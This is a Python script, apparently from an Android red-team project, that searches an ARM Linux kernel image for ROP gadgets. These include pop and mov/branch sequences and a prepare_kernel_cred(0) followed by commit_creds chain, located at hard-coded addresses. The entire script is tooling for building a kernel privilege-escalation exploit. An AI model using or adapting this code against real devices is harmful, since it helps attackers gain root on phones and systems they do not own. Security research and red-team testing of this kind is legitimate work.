import struct
data = open('C:/InfoSec/android-redteam/work/firmware/vmlinux_aqgf','rb').read()
BASE = 0xC0008000

print("=== ROP Gadget Search ===")
print(f"vmlinux size: {len(data)} bytes")

# 1. Search for mov r0, rN; bx/blx rM
for src_reg in [4,5,6,7,8]:
    mov = struct.pack('<I', 0xE1A00000 | src_reg)
    for dst_reg in [4,5,6,7,8,14]:
        bx = struct.pack('<I', 0xE12FFF10 | dst_reg)
        blx = struct.pack('<I', 0xE12FFF30 | dst_reg)
        for branch_name, branch_bytes in [('bx', bx), ('blx', blx)]:
            seq = mov + branch_bytes
            idx = data.find(seq)
            if idx != -1 and idx > 0:
                vaddr = idx + BASE
                print(f'mov r0, r{src_reg}; {branch_name} r{dst_reg} at 0x{vaddr:08X}')

# 2. Search for "mov r0, #0; bl prepare_kernel_cred" sequences
print("\n=== Looking for mov r0, #0 -> bl prepare_kernel_cred ===")
mov_r0_0 = struct.pack('<I', 0xE3A00000)
idx = 0
found = 0
while found < 5:
    idx = data.find(mov_r0_0, idx)
    if idx == -1:
        break
    for off in [4, 8, 12, 16]:
        if idx + off + 4 > len(data):
            break
        insn = struct.unpack_from('<I', data, idx+off)[0]
        if (insn & 0xFF000000) == 0xEB000000:
            bl_offset = insn & 0x00FFFFFF
            if bl_offset & 0x800000:
                bl_offset = bl_offset - 0x1000000
            target = (idx+off+BASE) + 8 + (bl_offset << 2)
            if target == 0xC00548E0:
                caller_addr = idx + BASE
                bl_addr = idx + off + BASE
                print(f'  mov r0, #0 @ 0x{caller_addr:08X}, bl prepare_kernel_cred @ 0x{bl_addr:08X}')
                # Check what follows — is there a bl commit_creds?
                for off2 in range(off+4, off+24, 4):
                    if idx + off2 + 4 > len(data):
                        break
                    insn2 = struct.unpack_from('<I', data, idx+off2)[0]
                    if (insn2 & 0xFF000000) == 0xEB000000:
                        bl_off2 = insn2 & 0x00FFFFFF
                        if bl_off2 & 0x800000:
                            bl_off2 = bl_off2 - 0x1000000
                        tgt2 = (idx+off2+BASE) + 8 + (bl_off2 << 2)
                        if tgt2 == 0xC0054328:
                            print(f'    !!! FOLLOWED BY bl commit_creds @ 0x{idx+off2+BASE:08X} !!!')
                            print(f'    FULL CHAIN: 0x{caller_addr:08X} -> prepare_kernel_cred(0) -> commit_creds()')
                            found += 10  # mark as super-found
                        elif tgt2 > 0xC0000000:
                            fn_name = f"0x{tgt2:08X}"
                            print(f'    then bl {fn_name} @ 0x{idx+off2+BASE:08X}')
                found += 1
    idx += 4

# 3. Also find pop {r0, pc} variants for chain building
print("\n=== pop gadgets ===")
for name, opcode in [
    ("pop {r0, pc}", 0xE8BD8001),
    ("pop {r0, r1, pc}", 0xE8BD8003),
    ("pop {r0, r4, pc}", 0xE8BD8011),
    ("pop {r3, pc}", 0xE8BD8008),
    ("pop {r4, pc}", 0xE8BD8010),
    ("ldm sp, {r0, pc}", 0xE89D8001),
]:
    opcode_bytes = struct.pack('<I', opcode)
    idx = data.find(opcode_bytes)
    if idx != -1:
        print(f'{name}: 0x{idx+BASE:08X}')

print("\nDone.")
